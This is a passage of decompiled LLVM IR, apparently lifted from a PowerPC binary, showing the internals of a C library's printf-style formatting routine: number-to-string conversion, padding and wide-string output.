  %v2_10003970 = inttoptr i32 %v1_10003970 to i32*
  %v3_10003970 = load i32, i32* %v2_10003970, align 4
  store i32 %v3_10003970, i32* %r0.global-to-local, align 4
  %v1_10003974 = call i32 @__asm_rlwinm(i32 %v3_10003970, i32 0, i32 20, i32 23)
  br label %dec_label_pc_10003978

dec_label_pc_10003978:                            ; preds = %dec_label_pc_1000395c, %dec_label_pc_10003968
  %v3_10003978 = load i32, i32* %stack_var_-344, align 4
  %v0_1000397c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000397c, i32* @r5, align 4
  %v2_10003980 = inttoptr i32 %v0_1000397c to i32*
  %v3_10003980 = call i32 @_load_inttype(i32 %v3_10003978, i32* %v2_10003980)
  %v0_10003990 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10003990, i32* %r8.global-to-local, align 4
  %v6_10003998 = call i32 @_uintmaxtostr(i8* %v5_10003998, i32 %v3_10003980, i32 %v3_10003978, i32 %v0_1000397c, i32 %v0_10003990)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_10003998, i32* %r30.global-to-local, align 4
  br i1 %tmp75, label %dec_label_pc_100039ec, label %dec_label_pc_100039ac

dec_label_pc_100039ac:                            ; preds = %dec_label_pc_10003978
  %v7_10003998 = inttoptr i32 %v6_10003998 to i8*
  %v3_100039ac = load i8, i8* %v7_10003998, align 1
  %v4_100039ac = zext i8 %v3_100039ac to i32
  store i32 %v4_100039ac, i32* %r0.global-to-local, align 4
  %v3_100039b4 = icmp eq i8 %v3_100039ac, 45
  br i1 %v3_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_100039d0

dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039ac
  %v1_100039bc = or i32 %v0_100039e0, 2
  store i32 %v1_100039bc, i32* %r0.global-to-local, align 4
  %v2_100039c0 = add i32 %v6_10003998, 1
  store i32 %v2_100039c0, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_100039ec

dec_label_pc_100039d0:                            ; preds = %dec_label_pc_100039ac
  %v1_100039d0 = and i32 %v0_100039e0, 2
  store i32 %v1_100039d0, i32* %r0.global-to-local, align 4
  %v3_100039d0 = icmp eq i32 %v1_100039d0, 0
  br i1 %v3_100039d0, label %dec_label_pc_100039e0, label %dec_label_pc_100039d8

dec_label_pc_100039d8:                            ; preds = %dec_label_pc_100039d0
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_100039ec

dec_label_pc_100039e0:                            ; preds = %dec_label_pc_100039d0
  %v1_100039e0 = urem i32 %v0_100039e0, 2
  store i32 %v1_100039e0, i32* %r11.global-to-local, align 4
  %v3_100039e0 = icmp eq i32 %v1_100039e0, 0
  br i1 %v3_100039e0, label %dec_label_pc_100039ec, label %dec_label_pc_100039e8

dec_label_pc_100039e8:                            ; preds = %dec_label_pc_100039e0
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_100039ec

dec_label_pc_100039ec:                            ; preds = %dec_label_pc_100039e0, %dec_label_pc_10003978, %dec_label_pc_100039d8, %dec_label_pc_100039bc, %dec_label_pc_100039e8
  %v0_10003a58 = phi i32 [ %v6_10003998, %dec_label_pc_10003978 ], [ %v2_100039c0, %dec_label_pc_100039bc ], [ %v6_10003998, %dec_label_pc_100039e0 ], [ %v6_10003998, %dec_label_pc_100039e8 ], [ %v6_10003998, %dec_label_pc_100039d8 ]
  %stack_var_-184.0 = phi i32 [ %v0_100039e0, %dec_label_pc_10003978 ], [ %v1_100039bc, %dec_label_pc_100039bc ], [ %v0_100039e0, %dec_label_pc_100039e0 ], [ %v0_100039e0, %dec_label_pc_100039e8 ], [ %v0_100039e0, %dec_label_pc_100039d8 ]
  %v3_100039ec = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10003c00, i32* %r0.global-to-local, align 4
  %v2_100039f4 = sub i32 %v2_10003c00, %v0_10003a58
  %v1_100039f8 = add i32 %v2_100039f4, 127
  store i32 %v1_100039f8, i32* %r31.global-to-local, align 4
  %tmp77 = icmp sgt i32 %v3_100039ec, -1
  br i1 %tmp77, label %dec_label_pc_10003a08, label %dec_label_pc_10003a04

dec_label_pc_10003a04:                            ; preds = %dec_label_pc_100039ec
  br label %dec_label_pc_10003a08

dec_label_pc_10003a08:                            ; preds = %dec_label_pc_100039ec, %dec_label_pc_10003a04
  %v0_10003a3c = phi i32 [ %v3_100039ec, %dec_label_pc_100039ec ], [ 1, %dec_label_pc_10003a04 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10003a0c = and i32 %stack_var_-184.0, 16
  store i32 %v1_10003a0c, i32* %r11.global-to-local, align 4
  %v3_10003a0c = icmp eq i32 %v1_10003a0c, 0
  br i1 %v3_10003a0c, label %dec_label_pc_10003a58, label %dec_label_pc_10003a14

dec_label_pc_10003a14:                            ; preds = %dec_label_pc_10003a08
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10003a18, label %dec_label_pc_10003a24, label %dec_label_pc_10003a34.thread

dec_label_pc_10003a34.thread:                     ; preds = %dec_label_pc_10003a14
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_10003a58

dec_label_pc_10003a24:                            ; preds = %dec_label_pc_10003a14
  br i1 %v3_10003a24, label %dec_label_pc_10003a2c, label %dec_label_pc_10003a34

dec_label_pc_10003a2c:                            ; preds = %dec_label_pc_10003a24
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_10003a58

dec_label_pc_10003a34:                            ; preds = %dec_label_pc_10003a24
  br i1 %v3_10003a34, label %dec_label_pc_10003a3c, label %dec_label_pc_10003a58

dec_label_pc_10003a3c:                            ; preds = %dec_label_pc_10003a34
  %v3_10003a3c = icmp ugt i32 %v0_10003a3c, %v1_100039f8
  br i1 %v3_10003a3c, label %dec_label_pc_10003a58, label %dec_label_pc_10003a44

dec_label_pc_10003a44:                            ; preds = %dec_label_pc_10003a3c
  %v1_10003a44 = inttoptr i32 %v0_10003a58 to i8*
  %v2_10003a44 = load i8, i8* %v1_10003a44, align 1
  %v3_10003a44 = zext i8 %v2_10003a44 to i32
  store i32 %v3_10003a44, i32* %r0.global-to-local, align 4
  %v3_10003a4c = icmp eq i8 %v2_10003a44, 48
  br i1 %v3_10003a4c, label %dec_label_pc_10003a58, label %dec_label_pc_10003a54

dec_label_pc_10003a54:                            ; preds = %dec_label_pc_10003a44
  %v1_10003a54 = add i32 %v2_100039f4, 128
  br label %dec_label_pc_10003a58

dec_label_pc_10003a58:                            ; preds = %dec_label_pc_10003a34.thread, %dec_label_pc_10003a34, %dec_label_pc_10003a44, %dec_label_pc_10003a3c, %dec_label_pc_10003a08, %dec_label_pc_10003a2c, %dec_label_pc_10003a54
  %v1_10003aa0 = phi i32 [ %v0_10003a3c, %dec_label_pc_10003a34 ], [ 1, %dec_label_pc_10003a44 ], [ %v0_10003a3c, %dec_label_pc_10003a3c ], [ %v0_10003a3c, %dec_label_pc_10003a08 ], [ %v0_10003a3c, %dec_label_pc_10003a2c ], [ %v1_10003a54, %dec_label_pc_10003a54 ], [ %v0_10003a3c, %dec_label_pc_10003a34.thread ]
  %v1_10003a58 = inttoptr i32 %v0_10003a58 to i8*
  %v2_10003a58 = load i8, i8* %v1_10003a58, align 1
  %v3_10003a58 = zext i8 %v2_10003a58 to i32
  store i32 %v3_10003a58, i32* %r0.global-to-local, align 4
  %v3_10003a5c = icmp eq i8 %v2_10003a58, 48
  br i1 %v3_10003a5c, label %dec_label_pc_10003a64, label %dec_label_pc_10003a9c

dec_label_pc_10003a64:                            ; preds = %dec_label_pc_10003a58
  %v0_10003a64 = load i32, i32* @r27, align 4
  %tmp78 = icmp slt i32 %v0_10003a64, 6
  br i1 %tmp78, label %dec_label_pc_10003a70, label %dec_label_pc_10003a6c

dec_label_pc_10003a6c:                            ; preds = %dec_label_pc_10003a64
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_10003a70

dec_label_pc_10003a70:                            ; preds = %dec_label_pc_10003a64, %dec_label_pc_10003a6c
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_10003a74, label %dec_label_pc_10003a7c, label %dec_label_pc_10003a8c

dec_label_pc_10003a7c:                            ; preds = %dec_label_pc_10003a70
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000bccc.359 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003c18

dec_label_pc_10003a8c:                            ; preds = %dec_label_pc_10003a70
  %v3_10003a8c = icmp eq i32 %v1_10003aa0, 0
  br i1 %v3_10003a8c, label %dec_label_pc_10003a94, label %dec_label_pc_10003a9c

dec_label_pc_10003a94:                            ; preds = %dec_label_pc_10003a8c
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10003c18

dec_label_pc_10003a9c:                            ; preds = %dec_label_pc_10003a8c, %dec_label_pc_10003a58
  %v3_10003a9c = icmp ugt i32 %v1_10003aa0, %v1_100039f8
  %v2_10003aa0 = sub i32 %v1_10003aa0, %v1_100039f8
  store i32 %v2_10003aa0, i32* %r29.global-to-local, align 4
  br i1 %v3_10003a9c, label %dec_label_pc_10003c38thread-pre-split, label %dec_label_pc_10003c18

dec_label_pc_10003aac:                            ; preds = %dec_label_pc_100038d0
  br i1 %v2_10003aac, label %dec_label_pc_10003ae0, label %dec_label_pc_10003ab4

dec_label_pc_10003ab4:                            ; preds = %dec_label_pc_10003aac
  %v3_10003ab4 = load i32, i32* %stack_var_-344, align 4
  %v0_10003ac0 = load i32, i32* %r24.global-to-local, align 4
  store i32 268450512, i32* @lr, align 4
  %v5_10003acc = call i32 @_fpmaxtostr(i32 %v0_10003ac0, i32* nonnull %stack_var_-196, i32 268449456, i32 %v3_10003ab4)
  %v1_10003ad0 = icmp slt i32 %v5_10003acc, 0
  br i1 %v1_10003ad0, label %dec_label_pc_10003d9c, label %dec_label_pc_10003ad8

dec_label_pc_10003ad8:                            ; preds = %dec_label_pc_10003ab4
  %v0_10003ad8 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003ad8 = add i32 %v0_10003ad8, %v5_10003acc
  store i32 %v2_10003ad8, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10003d88

dec_label_pc_10003ae0:                            ; preds = %dec_label_pc_10003aac
  br i1 %v2_10003ae0, label %dec_label_pc_10003b88, label %dec_label_pc_10003ae8

dec_label_pc_10003ae8:                            ; preds = %dec_label_pc_10003ae0
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10003af4 = load i32, i32* %stack_var_-344, align 4
  %v1_10003afc = inttoptr i32 %v3_10003af4 to i32*
  %v2_10003afc = load i32, i32* %v1_10003afc, align 4
  br i1 %v3_10003ae0, label %dec_label_pc_10003afc, label %dec_label_pc_10003b50

dec_label_pc_10003afc:                            ; preds = %dec_label_pc_10003ae8
  store i32 %v2_10003afc, i32* %r0.global-to-local, align 4
  %v3_10003b00 = icmp eq i32 %v2_10003afc, 0
  store i32 %v2_10003afc, i32* %stack_var_-340, align 4
  br i1 %v3_10003b00, label %dec_label_pc_10003c20, label %dec_label_pc_10003b0c

dec_label_pc_10003b0c:                            ; preds = %dec_label_pc_10003afc
  %v3_10003b0c = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10003b0c, i32* %r0.global-to-local, align 4
  %v1_10003b14 = icmp slt i32 %v3_10003b0c, 0
  br i1 %v1_10003b14, label %dec_label_pc_10003b20, label %dec_label_pc_10003b1c

dec_label_pc_10003b1c:                            ; preds = %dec_label_pc_10003b0c
  br label %dec_label_pc_10003b20

dec_label_pc_10003b20:                            ; preds = %dec_label_pc_10003b0c, %dec_label_pc_10003b1c
  %storemerge97 = phi i32 [ %v3_10003b0c, %dec_label_pc_10003b1c ], [ -1, %dec_label_pc_10003b0c ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 %v2_10003b20, i32* @r3, align 4
  store i32 %v2_10003b24, i32* @r6, align 4
  store i32 %v2_10003b20, i32* @r4, align 4
  store i32 268450608, i32* @lr, align 4
  %v0_10003b2c = call i32 @__GI_wcsrtombs()
  %v3_10003b30 = icmp eq i32 %v0_10003b2c, -1
  store i32 %v0_10003b2c, i32* @r31, align 4
  br i1 %v3_10003b30, label %dec_label_pc_10003d9c, label %dec_label_pc_10003b3c

dec_label_pc_10003b3c:                            ; preds = %dec_label_pc_10003b20
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003c38

dec_label_pc_10003b50:                            ; preds = %dec_label_pc_10003ae8
  store i32 %v2_10003c00, i32* @r28, align 4
  store i32 268450660, i32* @lr, align 4
  %v3_10003b60 = call i32 @__GI_wcrtomb(i32 %v2_10003c00, i32 %v2_10003afc, i32 %v2_10003b24)
  %v3_10003b64 = icmp eq i32 %v3_10003b60, -1
  store i32 %v3_10003b60, i32* @r31, align 4
  br i1 %v3_10003b64, label %dec_label_pc_10003d9c, label %dec_label_pc_10003b70

dec_label_pc_10003b70:                            ; preds = %dec_label_pc_10003b50
  store i32 %v2_10003c00, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10003b80 = load i32, i32* @r25, align 4
  %v1_10003b80 = load i32, i32* @r28, align 4
  %v3_10003b80 = trunc i32 %v0_10003b80 to i8
  %v4_10003b80 = add i32 %v1_10003b80, %v3_10003b60
  %v5_10003b80 = inttoptr i32 %v4_10003b80 to i8*
  store i8 %v3_10003b80, i8* %v5_10003b80, align 1
  %v0_10003c3c.pre.pre = load i32, i32* @r31, align 4
  %v1_10003c3c.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10003c38thread-pre-split

dec_label_pc_10003b88:                            ; preds = %dec_label_pc_10003ae0
  br i1 %v2_10003b88, label %dec_label_pc_10003bf4, label %dec_label_pc_10003b90

dec_label_pc_10003b90:                            ; preds = %dec_label_pc_10003b88
  %v3_10003b94 = load i32, i32* %stack_var_-344, align 4
  %v1_10003b9c = inttoptr i32 %v3_10003b94 to i32*
  %v2_10003b9c = load i32, i32* %v1_10003b9c, align 4
  br i1 %v3_10003b88, label %dec_label_pc_10003b9c, label %dec_label_pc_10003bcc

dec_label_pc_10003b9c:                            ; preds = %dec_label_pc_10003b90
  store i32 %v2_10003b9c, i32* %r30.global-to-local, align 4
  %v3_10003ba0 = icmp eq i32 %v2_10003b9c, 0
  br i1 %v3_10003ba0, label %dec_label_pc_10003c20, label %dec_label_pc_10003ba8

dec_label_pc_10003ba8:                            ; preds = %dec_label_pc_10003b9c, %dec_label_pc_10003bfc
  %v0_10003bbc = phi i32 [ %v2_10003b9c, %dec_label_pc_10003b9c ], [ %v3_10003c0c, %dec_label_pc_10003bfc ]
  %v3_10003ba8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10003ba8, i32* %r0.global-to-local, align 4
  %v1_10003bb0 = icmp slt i32 %v3_10003ba8, 0
  br i1 %v1_10003bb0, label %dec_label_pc_10003bbc, label %dec_label_pc_10003bb8

dec_label_pc_10003bb8:                            ; preds = %dec_label_pc_10003ba8
  br label %dec_label_pc_10003bbc

dec_label_pc_10003bbc:                            ; preds = %dec_label_pc_10003ba8, %dec_label_pc_10003bb8
  %storemerge98 = phi i32 [ %v3_10003ba8, %dec_label_pc_10003bb8 ], [ -1, %dec_label_pc_10003ba8 ]
  store i32 %storemerge98, i32* @r4, align 4
  store i32 268450756, i32* @lr, align 4
  %v1_10003bc0 = inttoptr i32 %v0_10003bbc to i8*
  %v2_10003bc0 = call i32 @strnlen(i8* %v1_10003bc0)
  store i32 %v2_10003bc0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10003c2c

dec_label_pc_10003bcc:                            ; preds = %dec_label_pc_10003b90
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 %v2_10003c00, i32* %r30.global-to-local, align 4
  store i32 %v2_10003b9c, i32* %stack_var_-328, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10003c38thread-pre-split

dec_label_pc_10003bf4:                            ; preds = %dec_label_pc_10003b88
  br i1 %v3_10003bf4, label %dec_label_pc_10003bfc, label %dec_label_pc_10003d9c

dec_label_pc_10003bfc:                            ; preds = %dec_label_pc_10003bf4
  %v0_10003bfc = call i32 @__errno_location()
  %v1_10003c04 = inttoptr i32 %v0_10003bfc to i32*
  %v2_10003c04 = load i32, i32* %v1_10003c04, align 4
  store i32 %v2_10003c04, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268450832, i32* @lr, align 4
  %v3_10003c0c = call i32 @__GI___glibc_strerror_r(i32 %v2_10003c04, i32 %v2_10003c00, i32 128)
  store i32 %v3_10003c0c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003ba8

dec_label_pc_10003c18:                            ; preds = %dec_label_pc_10003a9c, %dec_label_pc_10003a94, %dec_label_pc_10003a7c
  %v0_10003c3c.pre41 = phi i32 [ %v1_100039f8, %dec_label_pc_10003a9c ], [ 0, %dec_label_pc_10003a94 ], [ 5, %dec_label_pc_10003a7c ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10003c38thread-pre-split

dec_label_pc_10003c20:                            ; preds = %dec_label_pc_10003b9c, %dec_label_pc_10003afc
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000bcd4.360 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003c2c

dec_label_pc_10003c2c:                            ; preds = %dec_label_pc_10003bbc, %dec_label_pc_10003c20
  %v0_10003c3c29 = phi i32 [ %v2_10003bc0, %dec_label_pc_10003bbc ], [ 6, %dec_label_pc_10003c20 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10003c38

dec_label_pc_10003c38thread-pre-split:            ; preds = %dec_label_pc_10003b70, %dec_label_pc_10003bcc, %dec_label_pc_10003c18, %dec_label_pc_10003a9c
  %v1_10003c3c.pre = phi i32 [ %v2_10003aa0, %dec_label_pc_10003a9c ], [ 0, %dec_label_pc_10003c18 ], [ %v1_10003c3c.pre.pre, %dec_label_pc_10003b70 ], [ 0, %dec_label_pc_10003bcc ]
  %v0_10003c3c.pre = phi i32 [ %v1_100039f8, %dec_label_pc_10003a9c ], [ %v0_10003c3c.pre41, %dec_label_pc_10003c18 ], [ %v0_10003c3c.pre.pre, %dec_label_pc_10003b70 ], [ 1, %dec_label_pc_10003bcc ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_10003a9c ], [ %stack_var_-184.0, %dec_label_pc_10003c18 ], [ %v0_100039e0, %dec_label_pc_10003b70 ], [ %v0_100039e0, %dec_label_pc_10003bcc ]
  %v0_10003c38.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10003c38

dec_label_pc_10003c38:                            ; preds = %dec_label_pc_10003c38thread-pre-split, %dec_label_pc_10003b3c, %dec_label_pc_10003c2c
  %v1_10003c3c = phi i32 [ %v1_10003c3c.pre, %dec_label_pc_10003c38thread-pre-split ], [ 0, %dec_label_pc_10003b3c ], [ 0, %dec_label_pc_10003c2c ]
  %v0_10003c3c = phi i32 [ %v0_10003c3c.pre, %dec_label_pc_10003c38thread-pre-split ], [ %v0_10003b2c, %dec_label_pc_10003b3c ], [ %v0_10003c3c29, %dec_label_pc_10003c2c ]
  %v0_10003c44 = phi i32 [ %v0_10003c38.pr, %dec_label_pc_10003c38thread-pre-split ], [ 11, %dec_label_pc_10003b3c ], [ 11, %dec_label_pc_10003c2c ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10003c38thread-pre-split ], [ %v0_100039e0, %dec_label_pc_10003b3c ], [ %v0_100039e0, %dec_label_pc_10003c2c ]
  %v3_10003c38 = icmp eq i32 %v0_10003c44, 11
  %v2_10003c3c = add i32 %v0_10003c3c, %v1_10003c3c
  store i32 %v2_10003c3c, i32* %r0.global-to-local, align 4
  br i1 %v3_10003c38, label %dec_label_pc_10003c58, label %dec_label_pc_10003c44

dec_label_pc_10003c44:                            ; preds = %dec_label_pc_10003c38
  %v0_10003c48 = call i32 @__asm_mfcr()
  %v1_10003c4c = call i32 @__asm_rlwinm(i32 %v0_10003c48, i32 30, i32 31, i32 31)
  %v1_10003c50 = add i32 %v1_10003c4c, 1
  %v0_10003c54 = load i32, i32* %r0.global-to-local, align 4
  %v2_10003c54 = add i32 %v0_10003c54, %v1_10003c50
  store i32 %v2_10003c54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10003c58

dec_label_pc_10003c58:                            ; preds = %dec_label_pc_10003c38, %dec_label_pc_10003c44
  %v0_10003c70 = phi i32 [ %v2_10003c3c, %dec_label_pc_10003c38 ], [ %v2_10003c54, %dec_label_pc_10003c44 ]
  %v3_10003c60 = icmp ugt i32 %tmp, %v0_10003c70
  br i1 %v3_10003c60, label %dec_label_pc_10003c68, label %dec_label_pc_10003c6c

dec_label_pc_10003c68:                            ; preds = %dec_label_pc_10003c58
  %v2_10003c68 = sub i32 %tmp, %v0_10003c70
  br label %dec_label_pc_10003c6c

dec_label_pc_10003c6c:                            ; preds = %dec_label_pc_10003c58, %dec_label_pc_10003c68
  %storemerge96 = phi i32 [ %v2_10003c68, %dec_label_pc_10003c68 ], [ 0, %dec_label_pc_10003c58 ]
  %v1_10003c7c = phi i32 [ %v2_10003c68, %dec_label_pc_10003c68 ], [ 0, %dec_label_pc_10003c58 ]
  store i32 %storemerge96, i32* @r28, align 4
  %v0_10003c6c = load i32, i32* @r26, align 4
  %v3_10003c6c = icmp eq i32 %v0_10003c6c, 48
  %v2_10003c70 = add i32 %v1_10003c7c, %v0_10003c70
  store i32 %v2_10003c70, i32* %r0.global-to-local, align 4
  %v0_10003c74 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003c74 = add i32 %v0_10003c74, %v2_10003c70
  store i32 %v2_10003c74, i32* %r23.global-to-local, align 4
  br i1 %v3_10003c6c, label %dec_label_pc_10003c7c, label %dec_label_pc_10003c84

dec_label_pc_10003c7c:                            ; preds = %dec_label_pc_10003c6c
  %v0_10003c7c = load i32, i32* %r29.global-to-local, align 4
  %v2_10003c7c = add i32 %v0_10003c7c, %v1_10003c7c
  store i32 %v2_10003c7c, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10003c84

dec_label_pc_10003c84:                            ; preds = %dec_label_pc_10003c6c, %dec_label_pc_10003c7c
  %v0_10003c98 = phi i32 [ %v1_10003c7c, %dec_label_pc_10003c6c ], [ 0, %dec_label_pc_10003c7c ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10003c88 = and i32 %stack_var_-184.1, 8
  %v3_10003c88 = icmp eq i32 %v1_10003c88, 0
  br i1 %v3_10003c88, label %dec_label_pc_10003c90, label %dec_label_pc_10003cac

dec_label_pc_10003c90:                            ; preds = %dec_label_pc_10003c84
  %v0_10003c90 = load i32, i32* %r24.global-to-local, align 4
  store i32 268450976, i32* @lr, align 4
  %v4_10003c9c = call i32 @_charpad(i32 %v0_10003c90, i8 32, i32 %v0_10003c98)
  %v1_10003ca0 = load i32, i32* @r28, align 4
  %v4_10003ca0 = icmp eq i32 %v4_10003c9c, %v1_10003ca0
  br i1 %v4_10003ca0, label %dec_label_pc_10003ca8, label %dec_label_pc_10003d9c

dec_label_pc_10003ca8:                            ; preds = %dec_label_pc_10003c90
  br label %dec_label_pc_10003cac

dec_label_pc_10003cac:                            ; preds = %dec_label_pc_10003c84, %dec_label_pc_10003ca8
  %v0_10003cb0 = load i32, i32* %r24.global-to-local, align 4
  %v0_10003cb8 = load i32, i32* @r27, align 4
  %v2_10003cb8 = add i32 %v0_10003cb8, ptrtoint (i32* @global_var_1000bcdc.361 to i32)
  store i32 268451008, i32* @lr, align 4
  %v2_10003cbc = call i32 @__GI_fputs_unlocked(i32 %v2_10003cb8, i32 %v0_10003cb0)
  %v0_10003cc8 = load i32, i32* @r29, align 4
  store i32 268451024, i32* @lr, align 4
  %v4_10003ccc = call i32 @_charpad(i32 %v0_10003cb0, i8 48, i32 %v0_10003cc8)
  %v1_10003cd0 = load i32, i32* @r29, align 4
  %v4_10003cd0 = icmp eq i32 %v4_10003ccc, %v1_10003cd0
  br i1 %v4_10003cd0, label %dec_label_pc_10003cd8, label %dec_label_pc_10003d9c

dec_label_pc_10003cd8:                            ; preds = %dec_label_pc_10003cac
  %v3_10003cd8 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10003cd8, i32* %r0.global-to-local, align 4
  %v3_10003cdc = icmp eq i32 %v3_10003cd8, 0
  br i1 %v3_10003cdc, label %dec_label_pc_10003ce4, label %dec_label_pc_10003d0c

dec_label_pc_10003ce4:                            ; preds = %dec_label_pc_10003cd8
  %v0_10003ce4 = load i32, i32* @r31, align 4
  %v3_10003ce4 = icmp eq i32 %v0_10003ce4, 0
  br i1 %v3_10003ce4, label %dec_label_pc_10003d00.thread, label %dec_label_pc_10003d00

dec_label_pc_10003d00.thread:                     ; preds = %dec_label_pc_10003ce4
  br label %dec_label_pc_10003d70

dec_label_pc_10003d00:                            ; preds = %dec_label_pc_10003ce4
  %v0_10003cf0 = load i32, i32* @r30, align 4
  %v0_10003cf8 = load i32, i32* %r24.global-to-local, align 4
  store i32 268451072, i32* @lr, align 4
  %v4_10003cfc = inttoptr i32 %v0_10003cf8 to i16*
  %v5_10003cfc = call i32 @__stdio_fwrite(i32 %v0_10003cf0, i32 %v0_10003ce4, i16* %v4_10003cfc)
  %v1_10003d00.pre = load i32, i32* @r31, align 4
  %v4_10003d00 = icmp eq i32 %v5_10003cfc, %v1_10003d00.pre
  br i1 %v4_10003d00, label %dec_label_pc_10003d70, label %dec_label_pc_10003d9c

dec_label_pc_10003d0c:                            ; preds = %dec_label_pc_10003cd8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10003d54.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10003d54

dec_label_pc_10003d18:                            ; preds = %dec_label_pc_10003d54
  %v2_10003d68 = icmp ugt i32 %v0_10003d18, 128
  %v0_10003d18. = select i1 %v2_10003d68, i32 128, i32 %v0_10003d18
  store i32 %v0_10003d18., i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10003d28.362 to i32), i32* @lr, align 4
  %v0_10003d24 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10003d24, i32* @r30, align 4
  %v3_10003d2c = icmp eq i32 %v0_10003d24, 0
  br i1 %v3_10003d2c, label %dec_label_pc_10003d48, label %dec_label_pc_10003d40

dec_label_pc_10003d40:                            ; preds = %dec_label_pc_10003d18
  %v0_10003d30 = load i32, i32* %r24.global-to-local, align 4
  store i32 268451140, i32* @lr, align 4
  %v3_10003d40 = inttoptr i32 %v0_10003d30 to i16*
  %v4_10003d40 = call i32 @__stdio_fwrite(i32 %v2_10003c00, i32 %v0_10003d24, i16* %v3_10003d40)
  store i32 %v4_10003d40, i32* %r0.global-to-local, align 4
  %v1_10003d48.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10003d48

dec_label_pc_10003d48:                            ; preds = %dec_label_pc_10003d18, %dec_label_pc_10003d40
  %v1_10003d48 = phi i32 [ 0, %dec_label_pc_10003d18 ], [ %v1_10003d48.pre, %dec_label_pc_10003d40 ]
  %v0_10003d4c = phi i32 [ 0, %dec_label_pc_10003d18 ], [ %v4_10003d40, %dec_label_pc_10003d40 ]
  %v4_10003d48 = icmp eq i32 %v0_10003d4c, %v1_10003d48
  %v1_10003d4c = load i32, i32* @r31, align 4
  %v2_10003d4c = sub i32 %v1_10003d4c, %v0_10003d4c
  store i32 %v2_10003d4c, i32* @r31, align 4
  br i1 %v4_10003d48, label %dec_label_pc_10003d54, label %dec_label_pc_10003d9c

dec_label_pc_10003d54:                            ; preds = %dec_label_pc_10003d48, %dec_label_pc_10003d0c
  %v0_10003d18 = phi i32 [ %v2_10003d4c, %dec_label_pc_10003d48 ], [ %v0_10003d54.pre, %dec_label_pc_10003d0c ]
  %v3_10003d54 = icmp eq i32 %v0_10003d18, 0
  store i32 %v2_10003c00, i32* @r29, align 4
  store i32 %v2_10003b20, i32* @r4, align 4
  store i32 %v2_10003b24, i32* @r6, align 4
  store i32 %v2_10003c00, i32* @r3, align 4
  br i1 %v3_10003d54, label %dec_label_pc_10003d70, label %dec_label_pc_10003d18

dec_label_pc_10003d70:                            ; preds = %dec_label_pc_10003d54, %dec_label_pc_10003d00.thread, %dec_label_pc_10003d00
  %v0_10003d70 = load i32, i32* %r24.global-to-local, align 4
  %v0_10003d78 = load i32, i32* @r28, align 4
  store i32 268451200, i32* @lr, align 4
  %v4_10003d7c = call i32 @_charpad(i32 %v0_10003d70, i8 32, i32 %v0_10003d78)
  %v1_10003d80 = load i32, i32* @r28, align 4
  %v4_10003d80 = icmp eq i32 %v4_10003d7c, %v1_10003d80
  br i1 %v4_10003d80, label %dec_label_pc_10003d88, label %dec_label_pc_10003d9c

dec_label_pc_10003d88:                            ; preds = %dec_label_pc_10003d70, %dec_label_pc_10003ad8, %dec_label_pc_100038b0
